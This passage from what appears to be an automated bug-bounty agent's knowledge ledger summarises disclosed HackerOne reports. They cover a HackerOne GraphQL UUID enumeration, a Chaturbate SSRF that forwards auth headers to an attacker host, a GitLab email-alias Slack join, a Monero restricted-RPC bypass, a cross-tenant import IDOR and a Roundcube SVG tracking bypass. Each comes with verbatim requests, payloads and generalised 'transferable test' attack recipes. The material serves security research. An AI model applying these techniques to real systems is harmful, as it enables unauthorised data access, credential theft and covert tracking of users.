concrete instance plus the e-mail-domain harvest syntax.

SOURCE: https://hackerone.com/reports/447930  2026-11-11
ROUTE: live `.json` -> HTTP 200, 6,122 B, `visibility: full`, `vulnerability_information` 2,479 B read
IN FULL. Metadata: HackerOne's own program (team handle `security`), "Embedded submission form UUIDs can
be enumerated through GraphQL node interface, exposing sensitive program details", weakness Insecure
Direct Object Reference (IDOR), severity High, reporter `jobert`, submitted 2018-11-21, disclosed
2019-01-11, Resolved, 47 votes, asset hackerone.com.
STATUS: UNVERIFIED (not reproduced — no HackerOne GraphQL query was executed this pass; every
request/response below is verbatim from the report body).
CLASS: IDOR / broken object-level authorization on a GraphQL GLOBAL NODE INTERFACE — an opaque UUID the
application treats as an unguessable bearer credential is exposed by `node(id:)`, whose id is the
model's AUTO-INCREMENT PRIMARY KEY, so the id space enumerates the UUIDs (CWE-639 / CWE-200).
CORE METHOD:
  1. THE MISCONCEPTION, verbatim: "In normal application behavior, an embedded submission form is
     queried through GraphQL with a UUID. These UUIDs are random and they're not susceptible to brute
     force attacks. However, the UUID is not the primary key of these models. Instead, in the backend,
     it still has an auto incremental primary key. Because of that they can be queried directly using
     the node interface. From the node interface, the UUID is exposed, which can then be used to obtain
     the same information an invited reporter can access."
  2. THE NODE ID, verbatim: `Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==` — base64-decode it
     to read `gid://hackerone/EmbeddedSubmissionForm/9`; the trailing `9` is the auto-increment primary
     key, NOT the UUID.
  3. THE ENUMERATION QUERY, verbatim:
     query { node(id: "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==") { ... on EmbeddedSubmissionForm { uuid } } }
     Response: {"data":{"node":{"id":"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==","uuid":"████"}}}
     Change the trailing integer (`/9` -> `/10`, `/11`, ...), re-base64-encode, re-query -> each node
     returns its own UUID.
  4. THE USE OF THE UUID, verbatim: "take the UUID, and append `?embedded_submission_form_uuid=:uuid` to
     the GraphQL request" then:
     POST /graphql?embedded_submission_form_uuid=█████████ HTTP/1.1
     Host: hackerone.com
     {"query":"query { node(id: \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\") { ... on EmbeddedSubmissionForm { id, uuid team { handle policy } }}}","variables":{}}
     Response: {"data":{"node":{"id":"...","uuid":"███","team":{"handle":"██████████","policy":"The policy."}}}}
  5. THE SECOND DEFECT, verbatim: "There are essentially two vulnerabilities here: the ability to
     directly query the `EmbeddedSubmissionForm` object and the fact that by specifying a UUID, the
     `Team` object exposes too much information." — the `Team` object returns `policy`, terms, resolved
     bug count and bounty table to anyone who names a UUID.
  6. IMPACT, verbatim: "Any unauthenticated user can obtain the same information about a private program
     as a participating hacker."
DETECTION SIGNAL: a GraphQL API with a global Relay `node(id:)` interface; a node id that is a base64
`gid://<app>/<Type>/<n>` whose trailing `<n>` is a small sequential integer while the object's "secret"
is a separate random UUID; a type whose `uuid`/`token`/`secret`/`key` field is returned by the node
resolver; a query parameter that accepts the UUID (`?embedded_submission_form_uuid=`, `?form_uuid=`,
`?token=`) and unlocks a private object; a `Team`/`Program`/`Organization` object whose
`policy`/`terms`/bounty fields are returned with no viewer check.
CHAIN: any unauthenticated user (primitive: the `node(id:)` interface is reachable with no credentials)
-> the node id's trailing integer is the auto-increment PK, so walk `/9`, `/10`, `/11`... (escalation:
sequential enumeration of an "unguessable" object) -> each node returns its own opaque UUID (escalation:
the UUID-oracle) -> the UUID is appended as `?embedded_submission_form_uuid=` and the `Team` object
returns the private program's policy/terms/bounty table (impact: unauthenticated disclosure of
private-program details — the same information an invited reporter gets; program rated High). Per
doctrine §8: preconditions = none (unauthenticated); gain = the private program's policy, terms,
resolved bug count and bounty table.
TRANSFERABLE TEST: on ANY GraphQL API with a global `node(id:)` interface — (1) capture a node id from a
public object and base64-decode it (`echo <id> | base64 -d`) to read the `gid://<app>/<Type>/<n>` shape;
(2) if `<n>` is a small sequential integer, walk it (±1, then a batch) and request the type's
`uuid`/`token`/`secret`/`key` fields; (3) if a UUID/secret comes back, replay it in every parameter
that accepts it (`?embedded_submission_form_uuid=`, `?token=`, `?key=`, a header) and check whether a
private object resolves; (4) also ask the node for the parent object's sensitive fields
(`team{handle policy terms}`, `bounty_table`, `resolved_count`) with no credentials. Rule: **the global
node interface is a UUID-oracle — when its id is the model's auto-increment primary key, an
"unguessable" UUID is one integer away; enumerate the PK, read the UUID, then spend the UUID as the
bearer credential.**
DEDUPE: 0 hits across all three write targets for `447930`, `EmbeddedSubmissionForm`, `auto incremental`,
`node interface`, or a UUID exposed via a sequential PK. Pre-existing GraphQL material REVIEWED as
related-but-distinct: §17.313 / #724944 (a low-priv participant reads `latest_activity_at` via
`node(id:)` — a FIELD-level read of an object the caller can already see, not a UUID-oracle), the
#978143 `SurveyRatingItem` entry (~ledger 5463 — a `node(id:)` field read on an object type, no
PK->UUID escalation), §17.434 / #3275810 (a "secret token" that IS a sequential int — the secret is the
int itself, not a random UUID exposed through the int), and §17.167 / #2483666 (an archived UUID that
remains a valid credential — the supply of ids is the archive, not the node interface). NONE records the
global node interface as a UUID-oracle fed by the auto-increment PK. New general method -> §17.446.

SOURCE: https://hackerone.com/reports/411865  2026-11-11
ROUTE: live `.json` -> HTTP 200, 5,354 B, `visibility: full`, `vulnerability_information` 1,979 B read
IN FULL. Metadata: Chaturbate, "Blind SSRF at https://chaturbate.com/notifications/update_push/",
weakness Server-Side Request Forgery (SSRF), severity High, reporter `robin0oklay`, submitted 2018-09-20,
disclosed 2018-10-21, Resolved, 49 votes, asset chaturbate.com.
STATUS: UNVERIFIED (not reproduced — no Chaturbate account or subscription endpoint was touched this
pass; every request line below is verbatim from the report body).
CLASS: blind SSRF -> credential/header theft — a push-notification SUBSCRIPTION endpoint takes an
arbitrary `endpoint` URL and the server makes an AUTHENTICATED request to it, forwarding the user's own
Crypto-Key / Encryption / Authorization headers to the attacker's server (CWE-918 / CWE-200).
CORE METHOD:
  1. THE ENTRY POINT, verbatim request:
     POST /notifications/update_push/ HTTP/1.1
     Host: chaturbate.com
     Content-Type: application/x-www-form-urlencoded
     X-CSRFToken: YOURCSRFHERE
     X-Requested-With: XMLHttpRequest
     Cookie: YOURCOOKIEHERE
     subscription={"endpoint":"http:\/\/<attacker-host>\/wpush\/v2\/<path>&unsub=false
     (the report's URL is redacted with █; the shape is `subscription={"endpoint":"<absolute URL>","unsub":false}`.)
  2. THE TRIGGER, verbatim: "there is a functionality to subscribe any cam model which will trigger the
     provided request. Using this Request an attacker can execute SSRF attack and also steal sensitive
     Token / Keys of the internal web server."
  3. THE ORACLE, verbatim: "Go to this URL to confirm SSRF ... you will find that your Crypto-Key,
     Encryption header and Authorization Header is getting leaked onto the Attackers malicious site.
     These headers are very sensitive to be leaked."
  4. THE MISCONFIGURATION, verbatim: "The application do not require to send the URL along with the
     domain, it is secure to only send the Rest part of the URL and do not include the domain so that the
     attacker could not control the complete request." — i.e. the endpoint accepts a FULL absolute URL,
     not just a path.
DETECTION SIGNAL: a push-notification / webhook / subscription-registration endpoint whose body carries
an `endpoint`/`url`/`callback` field; a form-urlencoded or JSON body with a nested `subscription={...}`
object; a request authenticated with the user's own session/CSRF that is supposed to only touch the
user's own subscription; an incoming request at your listener carrying headers you did not ask for
(`Crypto-Key`, `X-Encryption-*`, `Authorization`, `X-Api-Key`) — the presence of the service's own auth
headers on YOUR host is the finding.
CHAIN: any authenticated low-priv user (primitive: an ordinary account) -> register/overwrite a push
subscription whose `endpoint` is an absolute URL on the attacker's host (primitive: the endpoint accepts
a full URL, not just a path) -> the server fetches that URL with the user's own credentials (escalation:
an authenticated server-side request to an attacker-chosen host) -> the attacker's listener receives the
user's Crypto-Key, Encryption and Authorization headers (impact: theft of the per-user
crypto/authorization material; program rated High). Per doctrine §8: preconditions = an authenticated
account and a reachable subscription endpoint; gain = the service's own auth/encryption headers
delivered to the attacker.
TRANSFERABLE TEST: on ANY push-subscription / webhook-registration / notification-endpoint feature —
(1) capture the registration request and set the `endpoint`/`url`/`callback` to an absolute URL on a
listener you control (`http://<you>/wpush/v2/x`); (2) submit it with your own session + CSRF; (3)
inspect the incoming request at your listener for the service's OWN headers — `Authorization`,
`X-Api-Key`, `Crypto-Key`, `X-Encryption-*`, an internal `X-Forwarded-*` — any header you did not set is
a leak; (4) if the endpoint only accepts a path, try a full URL, a `//host` scheme-relative value, and a
redirect from your host to an internal address. Rule: **a subscription/webhook endpoint that fetches a
caller-supplied URL with the service's own credentials is a header/credential-theft primitive —
subscribe your listener and read the Authorization/Crypto-Key headers it forwards.**
DEDUPE: 0 hits across all three write targets for `411865`, `update_push`, `crypto-key`, `Crypto-Key`,
`push subscription`, or a subscription endpoint forwarding the service's own headers. Pre-existing SSRF
material REVIEWED as related-but-distinct: §2.3 / #2301565 (a webhook "Test request" button — a
connectivity test, no credentials forwarded), the Octokit #446593 entry (a POST-with-credentials into the
internal network — a CI integration, not a user-facing push subscription), §17.405 / Azure Monitor
`adx()` (the query engine authenticates with the workspace JWT — a federated-query operator, not a
subscription registration), and the generic SSRF-with-credentials material. NONE records the
push-SUBSCRIPTION carrier nor the forwarded Crypto-Key/Encryption/Authorization header set. NO §17 slot:
the general method (an authenticated server-side fetch to a user-supplied URL leaks the service's own
headers) is already recorded; this is a concrete carrier + header set.

SOURCE: https://hackerone.com/reports/218230  2026-11-11
ROUTE: live `.json` -> HTTP 200, 19,829 B, `visibility: full`, `vulnerability_information` 1,903 B read
IN FULL. Metadata: GitLab, "Access to GitLab's Slack by abusing issue creation from e-mail", weakness
Improper Authentication - Generic, severity Critical, reporter `intidc` (Inti De Ceukelaire), submitted
2017-04-03, disclosed 2017-09-21, Resolved, 52 votes, asset gitlab.com.
STATUS: UNVERIFIED (not reproduced — no GitLab project, e-mail address or Slack workspace was touched
this pass; every step below is verbatim from the report body).
CLASS: authentication bypass / account-takeover chain via a TOKENIZED INCOMING-MAIL ALIAS at the
corporate domain — the app lets you create a valid `@gitlab.com` address
(`incoming+{username}/{projectname}+{token}@gitlab.com`) whose mail is delivered back to you, and a
third-party SaaS whose join gate is "anyone with the corporate e-mail domain" (Slack) accepts that
address -> internal workspace access (CWE-287 / CWE-345 / CWE-639).
CORE METHOD:
  1. THE JOIN GATE, verbatim: "The GitLab Slack login page allows anyone with a `@gitlab.com` e-mail
     address to join the team."
  2. THE ALIAS PRIMITIVE, verbatim: "GitLab allows new issues to be created when e-mailed to a unique
     e-mail address containing a secret token at `incoming+{username}/{projectname}+{token}@gitlab.com`."
  3. THE IDENTITY CLAIM, verbatim: "As you can see, this is a valid **@gitlab.com** e-mail address, so we
     can use the issues system to sign up for services like Slack, Facebook Workplace, ..."
  4. THE DELIVERY LOOP, verbatim: "These e-mail verification e-mails are e-mailed as new issue tickets
     to my project" — Slack's verification e-mail to the alias lands as an issue in the attacker's OWN
     project, so the attacker clicks the verification link.
  5. THE IMPACT, verbatim: "After clicking the verification link, all you need to do is set-up 2FA and
     you'll be able to access GitLab's Slack ... I gained access to dozens of channels possibly
     containing sensitive information." (The reporter deleted the account and did not read the channels.)
  6. THE SUGGESTED FIX, verbatim: "Requiring users to mail their issue tickets to a gitlab subdomain
     e-mail, such as `@reply.gitlab.com`" — i.e. move the alias off the corporate domain.
DETECTION SIGNAL: a service that creates a TOKENIZED alias/address at the corporate domain for a
user-owned resource — `incoming+{user}/{project}+{token}@<corp-domain>`, `reply+<token>@`, `+{token}@`,
a catch-all `*@<corp-domain>` that forwards to the owner; a third-party SaaS whose join/signup policy is
"anyone with the company e-mail domain" (Slack "find your workspace", Yammer, Facebook Workplace); a
verification e-mail that is delivered back to the alias owner (an issue/ticket/comment in the attacker's
own project). TELL: the alias domain is the SAME as the corporate domain the SaaS trusts.
CHAIN: any authenticated user who can create a project/issue (primitive: an ordinary GitLab account) ->
create a tokenized incoming-mail alias at the corporate domain
(`incoming+{username}/{project}+{token}@gitlab.com`) whose mail is delivered back to the attacker's own
project (primitive: the attacker OWNS an address at the corporate domain) -> sign up for a domain-gated
SaaS with that address (escalation: the SaaS's "anyone with @gitlab.com may join" gate is satisfied) ->
the SaaS's verification e-mail arrives as an issue in the attacker's project; click it (escalation: the
attacker controls the verification loop) -> the attacker is a verified member of the org's internal
workspace (impact: access to dozens of internal Slack channels; program rated Critical). Per doctrine §8:
preconditions = the ability to create a project/resource with a tokenized incoming-mail alias at the
corporate domain, plus a target SaaS whose join gate is the corporate domain; gain = verified membership
of the org's internal SaaS workspace.
TRANSFERABLE TEST: for every in-scope company — (1) enumerate features that mint an address at the
corporate domain: incoming-e-mail-to-issue/ticket/comment (`incoming+{user}/{project}+{token}@`),
reply-to aliases (`reply+<token>@`, `+{token}@`), a catch-all subdomain that forwards, a "send to this
address to create X" feature; (2) verify the alias actually receives mail and that the mail is delivered
somewhere the attacker can read (an issue/comment in the attacker's own project); (3) test the corporate
domain against third-party SaaS join gates (Slack "find your workspace", Yammer/Workplace domain join,
Facebook Workplace, a partner portal) — if the SaaS sends a verification e-mail to the alias and the
attacker can click it, the join gate is passed; (4) also test the reverse: can the alias be used to
RESET a corporate account (password-reset to the alias)? Rule: **a tokenized alias at the corporate
domain is an identity primitive — if you can mint an address the company's own domain trusts and read
its mail, every domain-gated SaaS will admit you.**
DEDUPE: 0 hits across all three write targets for `218230`, `incoming+`, `gitlab.com e-mail`,
`reply.gitlab.com`, or a tokenized incoming-mail alias used to pass a domain join gate. Pre-existing
material REVIEWED as related-but-distinct: §17.362 / #235139 (the SAME author's "Ticket Trick" — a
support desk that creates readable tickets for an UNVERIFIED address, so the attacker reads a ROLE
address's mail; the primitive there is an unverified-registration mailbox read, NOT minting an address
at the corporate domain), §17.223 (the same author's e-mail-layer parser differentials against an AI
agent — header-vs-envelope, not an alias-minting join), and the ledger's "email change -> ATO" /
"password-reset token in a response" entries (different primitives). NONE records the incoming-mail
ALIAS-MINTING primitive nor the "you own the address, so the domain gate accepts you" chain. New general
method -> §17.447.

NOTE — reader pass 2026-11-11 batch 148 (6 assigned sources read ONE BY ONE in the given order; 4
entries appended to the harvest ledger `/root/bugbountyhuntingskills.md` and the dated knowledge file
`/root/hackbot-architecture/knowledge/methodologies-2026-11-11.md`; 2 new §17 slots). NEW: #787955
(Topcoder/Lab45 — a member-search endpoint whose `fields` projection + `query=email:@domain` are
caller-controlled, plus an invite endpoint that echoes the PII of an array of arbitrary userIds -> mass
user-base PII enumeration; ledger entry, no §17 slot — the response-projection + write-over-share atoms
are already recorded), #447930 (HackerOne — the GraphQL global `node(id:)` interface uses the model's
auto-increment PK, so walking `/9`,`/10`,... returns each EmbeddedSubmissionForm's opaque UUID, which
then unlocks the private program's `Team{handle policy}` -> §17.446), #411865 (Chaturbate — a
push-subscription endpoint `POST /notifications/update_push/` takes an absolute `endpoint` URL and the
server fetches it with the user's own credentials, forwarding Crypto-Key/Encryption/Authorization to the
attacker's listener; ledger entry, no §17 slot — the authenticated-fetch-leaks-credentials method is
already recorded), #218230 (GitLab — a tokenized incoming-mail alias
`incoming+{user}/{project}+{token}@gitlab.com` whose mail returns to the attacker's own project is used
to pass Slack's "anyone with @gitlab.com may join" gate -> internal workspace access; §17.447).
VALID-BUT-NOT-APPENDED: #446293 (OLX, "SQL Injection https://www.olx.co.id", full body read from the
local disclosed-reports parquet `/tmp/h1_train.parquet` because the live `.json` route returns HTTP 404
and the live page is Cloudflare-gated — `POST /ajax/buybundle/getbundle/` with
`category={code sql injection}&subcategory=198&location=0`, sqlmap `--current-db` -> MySQL/MariaDB
`olxid`; a plain form-parameter SQLi with no sanitizer bypass and no chain, and the SQLi class is
already recorded in depth). INVALID: #215053 (Ubiquiti, "Ability to log in as any user without
authentication if █████████ is empty" — live `.json` HTTP 200 but `visibility: no-content`,
`vulnerability_information` 0 B; the title is the entire public record, no endpoint, no parameter, no
request shape, no bypass). 0 fabricated. Knowledge intake only — no target was touched; the only
network traffic was `web_extract`/`curl` against `hackerone.com` (live `.json` + `r.jina.ai`), the Wayback
availability endpoint, the Hugging Face datasets-server search API, and reads of the local
disclosed-reports parquet mirrors `/tmp/h1_{train,val,test}.parquet`.

SOURCE: https://hackerone.com/reports/3620006  2026-11-11
ROUTE: live `.json` -> HTTP 200, 21,329 B, `visibility: full`, `vulnerability_information` 16,441 B
read IN FULL. The live PAGE is not usable from this egress: `web_extract` -> 403, `r.jina.ai` ->
CAPTCHA then `/users/sign_in`, the browser tool -> HackerOne's own "Sorry, something went wrong",
and the Wayback capture (`20261010165106`) -> a JS-disabled shell (5,747 B, title only). The `.json`
route is the one that worked. Metadata: Monero, "Wallet RPC Restricted-Mode Policy Bypass",
weakness Improper Authentication - Generic, severity High (reporter-suggested CVSS 3.1 7.6
`AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L`), reporter `usagirabbit`, submitted 2026-03-21, disclosed
2026-08-17, Resolved, 54 votes.
STATUS: UNVERIFIED (not reproduced — no Monero build or wallet-RPC instance was stood up this pass;
every command and response below is verbatim from the report body).
CLASS: authorization bypass / privilege escalation — a DOCUMENTED restricted (view-only) mode is
enforced AD HOC inside individual RPC handlers instead of through a centralized allow/deny list, so
a client that is supposed to be read-only can call state-changing and key/proof handlers
(CWE-863 / CWE-841 / CWE-693).
CORE METHOD:
  1. The advertised contract, verbatim: `const command_line::arg_descriptor<bool> arg_restricted =
     {"restricted-rpc", "Restricts to view-only commands", false};` (`src/wallet/wallet_rpc_server.cpp:130`).
  2. The correct pattern exists but is applied PER HANDLER, verbatim: `if (m_restricted) {
     er.code = WALLET_RPC_ERROR_CODE_DENIED; er.message = "Command unavailable in restricted mode.";
     return false; }` (`src/wallet/wallet_rpc_server.cpp:1240`).
  3. The 18 handlers missing the check: `on_set_subaddr_lookahead` (:706), `on_create_address` (:732),
     `on_label_address` (:770), `on_create_account` (:833), `on_label_account` (:851),
     `on_tag_accounts` (:887), `on_untag_accounts` (:903), `on_set_account_tag_description` (:919),
     `on_get_tx_key` (:2640), `on_get_tx_proof` (:2732), `on_get_spend_proof` (:2799),
     `on_get_reserve_proof` (:2849), `on_export_key_images` (:3148), `on_start_mining` (:3535),
     `on_stop_mining` (:3570), `on_create_wallet` (:3592), `on_open_wallet` (:3685),
     `on_close_wallet` (:3756).
  4. The exact request shape: `curl -sS -H 'Content-Type: application/json' --data
     '{"jsonrpc":"2.0","id":"0","method":"create_wallet","params":{"filename":"attacker_wallet","password":"testpass","language":"English"}}'
     http://127.0.0.1:28090/json_rpc` -> `{"id":"0","jsonrpc":"2.0","result":{}}` (SUCCESS, not the
     restricted denial).
  5. `create_address` returns a real address (`8C7psYHwSsHMsasw…`, `address_index:1`);
     `export_key_images` -> `{"result":{"offset":0}}`; `get_tx_key` reaches the key-handling path
     (`{"error":{"code":-24,"message":"No tx secret key is stored for this tx"}}`) and
     `get_reserve_proof` reaches the proof path (`{"error":{"code":-1,"message":"Zero balance"}}`).
  6. The availability leg: `close_wallet` -> `result:{}`, then `get_balance` ->
     `{"error":{"code":-13,"message":"No wallet file"}}` — the active wallet is gone until an
     operator reloads or recreates it.
  7. The negative control that proves the mode is real: `transfer` with a wallet loaded ->
     `{"error":{"code":-7,"message":"Command unavailable in restricted mode."}}`.
  8. The bypass is auth-independent: the same calls succeed with NORMAL digest auth
     (`curl --digest -u 'monero:<generated-password>'`), so it does not depend on
     `--disable-rpc-login`.
DETECTION SIGNAL: any RPC / JSON-RPC / HTTP API that advertises a restricted / read-only /
view-only / dry-run / audit mode; enforcement code that appears INSIDE individual handler functions
rather than in a dispatcher or middleware; a documented or introspectable method list; a mode flag
(`--restricted-rpc`, `?readonly=1`, `X-Mode: view`) that is honoured by SOME methods and not others.
Tell: one method returns the mode's own denial string while a sibling mutating method returns
`result:{}`.
CHAIN: an operator exposes the RPC to a restricted client (primitive: the restricted role exists and
is network-reachable) -> the mode is enforced per-handler, so the mutating handlers are simply absent
from the deny list (primitive: incomplete enforcement of a documented security mode) -> a restricted
client calls `create_wallet` / `close_wallet` / `open_wallet` / `create_address` and reaches the
key/proof handlers (escalation: read-only -> state-changing + key-material-adjacent) -> `close_wallet`
breaks the active wallet until an operator intervenes (impact: authorization bypass + availability;
program rated High 7.6). Per doctrine §8: preconditions = a reachable restricted-mode RPC endpoint
and a valid restricted credential (the report proves it works with normal digest auth, so no
authentication bypass is needed); gain = create/close/open wallets, mutate address state, and reach
`get_tx_key` / `get_reserve_proof` / `export_key_images`.
TRANSFERABLE TEST: on ANY service that exposes a restricted / read-only / view-only mode —
(1) enumerate the full method/endpoint surface from the docs, the client, introspection, or a
wordlist; (2) reach a restricted-mode instance and call EVERY method one at a time with a valid
restricted credential; (3) any method that returns success where a sibling returns the mode's denial
is a bypass — record the exact request and the sibling's denial string as the differential;
(4) prioritise methods that CREATE, CLOSE, OPEN, DELETE, EXPORT or MINT, and any method whose name
contains `key`/`proof`/`secret`/`token`/`sign`/`admin`/`config`; (5) confirm the mode is real by
finding at least one method that DOES return the denial. Rule: **a security mode enforced inside
individual handlers is a deny-list with holes — enumerate the whole method surface against the
restricted instance and every mutating method that answers success is a privilege escalation.**
DEDUPE: 0 hits across all three write targets for `3620006`, `restricted-rpc`, `m_restricted`,
`monero-wallet-rpc`, `view-only`, or a restricted/read-only mode enforced per-handler. Pre-existing
Monero material REVIEWED as related-but-distinct: §17.335 / #2425873 (a daemon writes its credentials
to a PREDICTABLE path with a create-if-absent open — a file-precreation primitive, not a
policy-enforcement gap). Pre-existing `restricted` / `read-only` hits are RBAC role tests, read-only
API keys and sandbox modes — none records the "documented restricted mode enforced ad hoc
per-handler" method. New general method -> §17.448.

SOURCE: https://hackerone.com/reports/3543475  2026-11-11
ROUTE: live `.json` -> HTTP 200, 14,013 B, `visibility: full`, `vulnerability_information` 3,885 B
read IN FULL. Metadata: Basecamp, "Improper Access Control in `fizzy.do` import flow allows
cross-tenant ActionText reference resolution and data disclosure", weakness Improper Access Control -
Generic, severity Low, reporter `xavlimsg`, submitted 2026-02-07, disclosed 2026-04-14, Resolved,
53 votes, asset `app.fizzy.do` (max_severity critical).
STATUS: UNVERIFIED (not reproduced — no fizzy/Basecamp tenant or repo clone was stood up this pass;
every file/line reference below is verbatim from the report body).
CLASS: broken access control / cross-tenant IDOR — an IMPORT path resolves attacker-supplied GLOBAL
object references (`gid`) into persisted signed references (`sgid`) with NO tenant/ownership check,
while the EXPORT path in the same file DOES check ownership (CWE-639 / CWE-284).
CORE METHOD:
  1. The carrier: user-uploaded ZIP content is parsed into ActionText rich-text records; attachment
     references inside it are `gid` values.
  2. The vulnerable conversion, verbatim: `app/models/account/data_transfer/action_text_rich_text_record_set.rb`,
     import-time method `convert_gids_to_sgids` "converts attacker-controlled `gid` values into
     persisted `sgid` values by resolving the target record globally" (lines 83, 87, 88, 89) —
     "The import path has no tenant ownership check before minting the signed reference."
  3. The asymmetry that proves intent: the EXPORT path in the SAME file has an account check —
     `record&.account_id == account.id` at `action_text_rich_text_record_set.rb:69`.
  4. The reachable entry point from a normal upload flow:
     `app/controllers/account/imports_controller.rb:38` -> `app/models/account/import.rb:37` ->
     `import.rb:39`.
  5. The PoC success signals: `RESULT: IMPACT_CONFIRMED=true`,
     `imported.account_id = <attacker_account_id>`, `resolved_account_id = <victim_account_id>`
     (different tenant), `attachable_text = @alice_secret`.
  6. The remediation the reporter names: in `convert_gids_to_sgids`, only mint the `sgid` when
     `record.respond_to?(:account_id) && record.account_id == account.id`, else drop or ignore the
     cross-account reference.
DETECTION SIGNAL: any import / migration / restore / backup-unzip / CSV-or-ZIP data-transfer flow
that accepts GLOBAL object references from the uploaded payload (`gid`, `globalID`, `node(id:)`, a
UUID, a foreign key) and converts them into a persisted local reference; an EXPORT or DOWNLOAD path
in the same module that DOES check ownership (`record.account_id == account.id`, `current_user`, a
tenant/project scope) while the IMPORT path does not; a rich-text / attachment / embedded-reference
field inside an imported archive. Tell: the same file checks ownership on the way OUT but not on the
way IN.
CHAIN: an ordinary authenticated user (primitive: the import flow is a normal self-service feature) ->
uploads an archive whose rich text carries a `gid` pointing at a VICTIM tenant's attachable record
(primitive: the reference is resolved globally, not scoped to the importer) -> `convert_gids_to_sgids`
mints a persisted `sgid` for that victim record (escalation: the cross-tenant reference is now stored
in the attacker's account) -> the imported rich text resolves/renders the victim's attachable data in
the attacker's context (impact: cross-tenant data disclosure plus a persisted unauthorized reference;
asset max_severity critical, program rated Low). Per doctrine §8: preconditions = an authenticated
account with access to the import/upload flow and a known or derivable `gid` for a victim record;
gain = the victim tenant's attachable data rendered in the attacker's account.
TRANSFERABLE TEST: on ANY import / migration / restore / backup-unzip flow — (1) export your OWN data
first and harvest every global reference it contains (`gid://…`, UUIDs, foreign keys, attachment
ids); (2) build an import package (ZIP/JSON/XML/CSV) whose rich-text / attachment / reference fields
carry a reference belonging to a SECOND tenant you control as the control, and then one belonging to
a victim; (3) import it and re-read the imported object — if the victim's reference resolves/renders
in your account, the import path is not tenant-scoped; (4) diff the EXPORT and IMPORT code paths for
an ownership check (`account_id ==`, `current_user`, tenant scope) — the export-side check with no
import-side twin is the root cause; (5) also test the reverse: can an imported reference be used to
WRITE into the victim's object? Rule: **global object references are tenant-agnostic by design — an
import path that resolves them without an ownership check turns every uploaded archive into a
cross-tenant read primitive; the export path's ownership check is the spec the import path failed to
implement.**
DEDUPE: 0 hits across all three write targets for `3543475`, `convert_gids_to_sgids`, `sgid`,
`fizzy.do`, `xavlimsg`, or an import path resolving global references without a tenant check.
Pre-existing ActionText material REVIEWED as related-but-distinct: §17.164 / #2389565 (the
`action-text-attachment` ELEMENT re-hydrated unsanitized on the EDIT route — a sanitizer differential,
not a tenant-scope gap). Pre-existing import/migration material REVIEWED as related-but-distinct: the
GitLab import shell-interpolation RCE (~ledger 2161) and the GitLab bulk-import tar-symlink read
(~ledger 2186) — both are code-execution / file-read primitives inside an import pipeline, not a
cross-tenant reference-resolution authorization gap. New general method -> §17.449.

SOURCE: https://hackerone.com/reports/3486747  2026-11-11
ROUTE: live `.json` -> HTTP 200, 9,142 B, `visibility: full`, `vulnerability_information` 2,785 B
read IN FULL. Metadata: Nextcloud (Roundcube), "SVG filter primitives bypass remote image blocking,
enabling email tracking without consent.", weakness Privacy Violation, severity Medium, reporter
`nullcathedral`, submitted 2026-01-04, disclosed 2026-04-20, Resolved, 53 votes, asset
`https://github.com/roundcube/roundcubemail` (SOURCE_CODE, max_severity critical).
STATUS: UNVERIFIED (not reproduced — no Roundcube instance was stood up this pass; the payload below
is verbatim from the report body).
CLASS: sanitizer / remote-resource blocklist bypass with privacy impact — the HTML sanitizer's
`is_image_attribute()` covers `<img>`, `<image>` and `<use>` but not the SVG filter primitive
`<feImage>`, whose `href` instead passes through `wash_link()`, which permits external HTTP/HTTPS
URLs (CWE-693 / CWE-1333 / CWE-200).
CORE METHOD:
  1. The premise to violate: `allow_remote` is `false`, i.e. "Block remote images" is ON.
  2. The blocklist, verbatim: "Roundcube's HTML sanitizer `rcube_washtml` blocks external resources in
     `<img>`, `<image>`, and `<use>` tags by checking their src/href attributes through
     `is_image_attribute()`."
  3. The hole, verbatim: "the `<feImage>` SVG filter primitive is allowlisted as an element but its
     href attribute is not recognized as an image source. Instead, it passes through `wash_link()`
     which permits external HTTP/HTTPS URLs."
  4. The payload, verbatim (1x1 invisible SVG in the HTML part of an e-mail):
     `<svg width="1" height="1" style="position:absolute;left:-9999px;"><defs><filter id="t">
     <feImage href="https://httpbin.org/image/svg?email=victim@test.com" width="1" height="1"/>
     </filter></defs><rect filter="url(#t)" width="1" height="1"/></svg>`
  5. The observation, verbatim: "See HTTP request made to
     `https://httpbin.org/image/svg?email=victim@test.com` when the e-mail is opened" — the remote
     fetch fires DESPITE the block-remote-images setting.
  6. The impact, verbatim: "(1) Email open tracking / read receipts without consent (2) IP address
     disclosure (Geolocation inference) (3) User agent fingerprinting".
DETECTION SIGNAL: any sanitizer / blocklist that claims to block remote resources and enumerates the
ELEMENTS it inspects (`img`, `image`, `use`, `link`, `script`, `iframe`, `object`, `embed`, `video`,
`source`, `meta`) — the tell is that the list is ELEMENT-keyed, so any element NOT on the list that can
still carry a URL is a candidate (`feImage`, `feDisplacementMap in/in2`, `feComposite`, `<animate
href>`, `<set attributeName="href">`, `<mpath>`, `<textPath>`, `<altGlyph>`, `xlink:href` on any SVG
element, CSS `url()` / `@import` / `background`, `<style>` blocks); a "block remote images / external
content / remote fetch" mode in a mail client, chat app, CMS or wiki; a privacy setting whose
enforcement lives in the renderer rather than in the fetch layer. Tell: the blocklist names the usual
suspects and the attacker only has to find the one URL-carrying attribute it forgot.
CHAIN: the recipient has "block remote images" ENABLED (primitive: a client-side privacy control the
user relies on) -> the attacker embeds an invisible SVG whose `<feImage href>` points at the
attacker's collector with a victim-specific query string (primitive: a URL carrier the sanitizer does
not recognise as an image source) -> the renderer resolves the filter and fetches the URL
(escalation: the blocklist is bypassed) -> the collector logs the victim's IP, User-Agent and open
time (impact: consent-free tracking + IP/UA disclosure; asset max_severity critical, program rated
Medium). Per doctrine §8: preconditions = the ability to send HTML mail / upload HTML content that
the target renders, and a renderer whose remote-resource blocklist is element-keyed; gain = the
recipient's IP address, User-Agent and open timestamp.
TRANSFERABLE TEST: on ANY target with a "block remote images / external content" mode —
(1) enumerate the elements/attributes the sanitizer actually inspects (read the sanitizer source, or
diff the rendered HTML of a test message containing every URL carrier); (2) for each carrier NOT on
the list, embed a 1x1 invisible element pointing at your collector with a unique marker per victim
(`<feImage href>`, `<animate attributeName="href" values="https://<you>/x">`, `<use href>`,
